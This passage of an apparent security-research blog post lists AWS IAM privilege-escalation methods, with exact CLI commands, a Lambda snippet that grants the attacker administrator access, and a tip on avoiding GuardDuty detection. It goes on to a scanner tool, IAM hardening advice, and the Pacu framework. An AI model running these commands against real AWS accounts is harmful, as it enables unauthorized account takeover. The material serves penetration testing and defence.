> _aws iam put-user-policy –user-name my\_username –policy-name my\_inline\_policy –policy-document file://path/to/administrator/policy.json_

Where the user name is the current user.

**Potential Impact:** Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.

#### 11. Creating/updating an inline policy for a group

**Description:** An attacker with the iam:PutGroupPolicy permission can escalate privileges by creating or updating an inline policy for a group that they are a part of, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

> _aws iam put-group-policy –group-name group\_i\_am\_in –policy-name group\_inline\_policy –policy-document file://path/to/administrator/policy.json_>

Where the group is a group the current user is in.

**Potential Impact:** Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.

#### 12. Creating/updating an inline policy for a role

**Description:** An attacker with the iam:PutRolePolicy permission can escalate privileges by creating or updating an inline policy for a role that they have access to, adding the permissions of that policy to the attacker.

An example command to exploit this method might look like this:

> _aws iam put-role-policy –role-name role\_i\_can\_assume –policy-name role\_inline\_policy –policy-document file://path/to/administrator/policy.json_

Where the role is a role that the current user can temporarily assume with sts:AssumeRole.

**Potential Impact:** Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.

#### 13. Adding a user to a group

**Description:** An attacker with the iam:AddUserToGroup permission can use it to add themselves to an existing IAM Group in the AWS account.

An example command to exploit this method might look like this:

> _aws iam add-user-to-group –group-name target\_group –user-name my\_username_

Where target\_group has more/different privileges than the attacker’s user account.

**Potential Impact:** The attacker would be able to gain privileges of any existing group in the account, which could range from no privilege escalation to full administrator access to the account.

#### 14. Updating the AssumeRolePolicyDocument of a role

**Description:** An attacker with the iam:UpdateAssumeRolePolicy and sts:AssumeRole permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.

An example command to exploit this method might look like this:

> _aws iam update-assume-role-policy –role-name role\_i\_can\_assume –policy-document file://path/to/assume/role/policy.json_

Where the policy looks like the following, which gives the user permission to assume the role:

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/image-3-750x292.png)

**Potential Impact:** This would give the attacker the privileges that are attached to any role in the account, which could range from no privilege escalation to full administrator access to the account.

#### 15. Passing a role to a new Lambda function, then invoking it

**Description:** A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.

An example set of commands to exploit this method might look like this:

> _aws lambda create-function –function-name my\_function –runtime python3.6 –role arn\_of\_lambda\_role –handler lambda\_function.lambda\_handler –code file://my/python/code.py_

Where the code in the python file would utilize the targeted role. An example that uses IAM to attach an administrator policy to the current user can be seen here:

> import boto3
>
> def lambda\_handler(event, context):
>
> client = boto3.client(‘iam’)
>
> response = client.attach\_user\_policy(
>
> UserName=’my\_username’,
>
> PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’
>
> )
>
> return response

After this, the attacker would then invoke the Lambda function using the following command:

> _aws lambda invoke –function-name my\_function output.txt_

Where output.txt is where the results of the invocation will be stored.

**Potential Impact:** This would give a user access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.

#### 16. Passing a role to a new Lambda function, then triggering it with DynamoDB

**Description:** A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.

An example set of commands to exploit this method might look like this:

> _aws lambda create-function –function-name my\_function –runtime python3.6 –role arn\_of\_lambda\_role –handler lambda\_function.lambda\_handler –code file://my/python/code.py_

Where the code in the python file would utilize the targeted role. An example would be the same script used in method 11’s description.

After this, the next step depends on whether DynamoDB is being used in the current AWS environment. If it is being used, all that needs to be done is creating the event source mapping for the Lambda function, but if not, then the attacker will need to create a table with streaming enabled with the following command:

> _aws dynamodb create-table –table-name my\_table –attribute-definitions AttributeName=Test,AttributeType=S –key-schema AttributeName=Test,KeyType=HASH –provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 –stream-specification StreamEnabled=true,StreamViewType=NEW\_AND\_OLD\_IMAGES_

After this command, the attacker would connect the Lambda function and the DynamoDB table by creating an event source mapping with the following command:

> _aws lambda create-event-source-mapping –function-name my\_function –event-source-arn arn\_of\_dynamodb\_table\_stream –enabled –starting-position LATEST_

Now that the Lambda function and the stream are connected, the attacker can invoke the Lambda function by triggering the DynamoDB stream. This can be done by putting an item into the DynamoDB table, which will trigger the stream, using the following command:

> _aws dynamodb put-item –table-name my\_table –item Test={S=”Random string”}_

At this point, the Lambda function will be invoked, and the attacker will be made an administrator of the AWS account.

**Potential Impact:** This would give an attacker access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.

#### 17. Updating the code of an existing Lambda function

**Description:** An attacker with the lambda:UpdateFunctionCode permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role. They would then need to wait for it to be invoked if they were not able to do so directly, but if it already exists, there is likely some way that it will be invoked.

An example command to exploit this method might look like this:

> _aws lambda update-function-code –function-name target\_function –zip-file fileb://my/lambda/code/zipped.zip_

Where the associated .zip file contains code that utilizes the Lambda’s role. An example could include the code snippet from methods 11 and 12.

**Potential Impact:** This would give an attacker access to the privileges associated with the Lambda service role that is attached to that function, which could range from no privilege escalation to full administrator access to the account.

#### 18. Passing a role to a Glue Development Endpoint

**Description:** An attacker with the iam:PassRole and glue:CreateDevEndpoint permissions could create a new AWS Glue development endpoint and pass an existing service role to it. They then could SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

An example command to exploit this method might look like this:

> _aws glue create-dev-endpoint –endpoint-name my\_dev\_endpoint –role-arn arn\_of\_glue\_service\_role –public-key file://path/to/my/public/ssh/key.pub_

Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Even though it is not specifically noted in the GuardDuty documentation, like method number 2 (Creating an EC2 instance with an existing instance profile), it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.

**Potential Impact:** This would give an attacker access to the privileges associated with any Glue service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.

#### 19. Updating an existing Glue Dev Endpoint

**Description:** An attacker with the glue:UpdateDevEndpoint permission would be able to update the associated SSH public key of an existing Glue development endpoint, to then SSH into it and have access to the permissions the attached role has access to.

An example command to exploit this method might look like this:

> _aws glue –endpoint-name target\_endpoint –public-key file://path/to/my/public/ssh/key.pub_

Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Like method number 14, even though it is not specifically noted in the GuardDuty documentation, it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.

**Potential Impact:** This would give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint, which could range from no privilege escalation to full administrator access to the account.

#### 20. Passing a role to CloudFormation

**Description:** An attacker with the iam:PassRole and cloudformation:CreateStack permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.

An example command to exploit this method might look like this:

> _aws cloudformation create-stack –stack-name my\_stack –template-url http://my-website.com/my-malicious-template.template –role-arn arn\_of\_cloudformation\_service\_role_

Where the template located at the attacker’s website includes directions to perform malicious actions, such as creating an administrator user and then using those credentials to escalate their own access.

**Potential Impact:** This would give an attacker access to the privileges associated with the role that was passed when creating the CloudFormation stack, which could range from no privilege escalation to full administrator access to the account.

#### 21. Passing a role to Data Pipeline

**Description:** An attacker with the iam:PassRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions would be able to escalate privileges by creating a pipeline and updating it to run an arbitrary AWS CLI command or create other resources, either once or on an interval with the permissions of the role that was passed in.

Some example commands to exploit this method might look like these:

> _aws datapipeline create-pipeline –name my\_pipeline –unique-id unique\_string_

Which will create an empty pipeline. The attacker then needs to update the definition of the pipeline to tell it what to do, with a command like this:

> _aws datapipeline put-pipeline-definition –pipeline-id unique\_string –pipeline-definition file://path/to/my/pipeline/definition.json_

Where the pipeline definition file contains a directive to run a command or create resources using the AWS API that could help the attacker gain additional privileges.

**Potential Impact:** This would give the attacker access to the privileges associated with the role that was passed when creating the pipeline, which could range from no privilege escalation to full administrator access to the account.

### Scanning for Permission Flaws: aws\_escalate

While any of these privilege escalation methods can be checked manually, by either manually reviewing the users IAM permissions or attempting to exploit each method, it can be very time consuming.

To automate this process, we have written a tool to do all that checking for you: [aws\_escalate.py.](https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws\_escalate.py)

Using the script ([Github available here](https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws\_escalate.py)), it is possible to detect what users have access to what privilege escalation methods in an AWS environment. It can be run against any single user or every user in the account if the access keys being used have IAM read access.  Results output is in csv, including a breakdown of users scanned and the privilege escalation methods they are vulnerable to.

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/scanner2.gif)

When opened in Excel, the left-most column contains the names of all the privilege escalation methods that were checked for and the top-most row includes the names of all the IAM users that were checked.

Every field (intersecting a specific vulnerability and tested key) has three possible values:  Confirmed,  Potential, or Blank (the associated account is not vulnerable).  “Confirmed” means it is _confirmed_ that that privilege escalation method works for that user.

If the cell is “Potential”, that means that that privilege escalation method will _potentially_ work, but further investigation is required.

An example of this case is when the user has the required permissions for a method, but the script can’t determine if the resources they can execute on allow for privilege escalation or not.\
If the cell is empty, the user does not have the required permissions for that escalation method.

If a user is detected to already have administrator privileges, they will be marked with “(Admin)” next to their username in their column.

#### aws\_escalate Usage and Example

The ‘help’ output of the tool:

_usage: aws\_escalate.py \[-h] \[–all-users] \[–user-name USER\_NAME]_\
_–access-key-id ACCESS\_KEY\_ID –secret-key_\
_SECRET\_KEY \[–session-token SESSION\_TOKEN]_\
\
_This script will fetch permissions for a set of users and then scan for_\
_permission misconfigurations to see what privilege escalation methods are_\
_possible. Available attack paths will be output to a .csv file in the same directory._\
\
_optional arguments:_\
_-h, –help            show this help message and exit_\
_–all-users           Run this module against every user in the account._\
_._\
_–user-name USER\_NAME_\
_A single username of a user to run this module_\
_against. By default, the user to which the active AWS_\
_keys belong to will be used._\
_–access-key-id ACCESS\_KEY\_ID_\
_The AWS access key ID to use for authentication._\
_–secret-key SECRET\_KEY_\
_The AWS secret access key to use for authentication._\
_–session-token SESSION\_TOKEN_\
_The AWS session token to use for authentication, if_\
_there is one._\
\
_Some usage examples:_\
\
_Check what privilege escalation methods the current user has access to:_\
\
_python3 aws\_escalate.py –access-key-id ABCDEFGHIJK –secret-key hdj6kshakl31/1asdhui1hka_\
\
_Check what privilege escalation methods a specific user has access to:_\
_python3 aws\_escalate.py –user-name some\_other\_user –access-key-id ABCDEFGHIJK –secret-key hdj6kshakl31/1asdhui1hka_\
_Check what privilege escalation methods all users have access to:_\
_python3 aws\_escalate.py –all-users –access-key-id ABCDEFGHIJK –secret-key hdj6kshakl31/1asdhui1hka_\


Here is an example .csv output of the aws\_escalate.py scan I ran against a test environment.  This sandbox environment has 10 separate IAM users, two of which already have administrator privileges (Dave and Spencer) and two are not vulnerable to any of the privilege escalation methods (Bill and BurpS3Checker).

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/csv-example.png)

### Defense and Mitigation

In general, defending against these attacks is (in theory) relatively simple. The complication comes in when trying to defend against these kinds of attacks when your own environment. In any case, the number one recommendation would be to fully utilize the “Resource” option of IAM policies, and this includes using the built-in variables that policies support.

A list of supporting variables and descriptions can be found here: [https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_variables.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference\_policies\_variables.html), but broadly, they allow you set allow or deny certain IAM permissions based on something you don’t know exactly at the time of creation or something that can change over time, from user to user, or other ways (a variable).

The two main IAM policy variables to pay attention to are “aws:SourceIp” (the IP address detected when making API calls) and “aws:username” (the username of the user who is making API calls). Obviously, by restricting permissions to a known IP address, the chances of API calls coming from that IP are not malicious is greatly increased.

By using the “aws:username” variable, it is possible to give users a variety of IAM permissions that they can only execute against themselves. Examples of permissions you would want to use this variable in the resource for include aws:CreateAccessKey (method #4), aws:CreateLoginProfile (method #5), and aws:UpdateLoginProfile (method #6). Included in this list should be permissions relating to setting up (**not** deleting/removing) multi-factor authentication for the current user account. By giving an IAM user all of these permissions but restricting them to only being allowed to be run on the current user, a user can create their own login profile/password, change their own password, create themselves a new set of access keys, and setup multi-factor authentication for themselves.

A policy like that might look like the following:

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/Screenshot\_1-750x345.png)

Now for any user that this policy is attached to, they can only perform those four actions on themselves, because of the user of the “aws:username” variables. This example policy shows how to correctly format those variables to be recognized correctly by IAM, which is done by putting the IAM variable name inside curly-brackets that begin with a money sign (${example-variable}).

To restrict access to a certain IP address, the IAM policy must user the “Condition” key to set a condition that the IAM user is allowed to perform these actions, if and only if this condition is set. The following IAM policy document snippet shows “Condition” being used to restrict access to only those users who run API calls after a certain time (2013-08-16T12:00:00Z), before another time (2013-08-16T15:00:00Z) and having an IP address originating from a certain CIDR range (192.0.2.0/24 or 203.0.113.0/24).

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/Screenshot\_1-1-500x315.png)

### Preview: AWS Exploitation and Pacu

This AWS privilege escalation scanner came from a larger Rhino project currently in development – Pacu (aptly named after a type of Piranha in the Amazon).

Pacu is an open source AWS post-exploitation framework, designed for offensive security testing against AWS environments.

Created and maintained by Rhino Security Labs, the framework allows penetration testers to identify areas of attack once initial access is obtained to an AWS account.  Like other open source offensive security tools, Pacu is built to identify AWS flaws and misconfigurations, helping AWS users better understand the impact of those risks.

One of these modules will be a similar privilege escalation scanner, with the option to exploit any vulnerable account automatically.  This following video shows Pacu identifying a privilege escalation route and exploiting it for immediate AWS administrator access.

![.gitbook/assets/1664529902_665.png](https://rhinosecuritylabs.com/wp-content/uploads/2018/06/pacu.gif)

### Pacu Beta Testing

**EDIT (8/13/18): Pacu beta has now been closed and is now live on GitHub:** [https://github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)

A supporting OWASP Talk can be found on [YouTube here.](https://youtu.be/XfetW1Vqybw?list=PLBID4NiuWSmfdWCmYGDQtlPABFHN7HyD5)

### Conclusion

AWS security can be a tough task to accurately and successfully take on, but by protecting against privilege escalation attacks, security of an AWS environment can be improved significantly.

This striving for security maturation in the cloud is why we’re developing an AWS post-exploitation tool, Pacu.  Pacu will be publicly released as an open source project early August 2018.

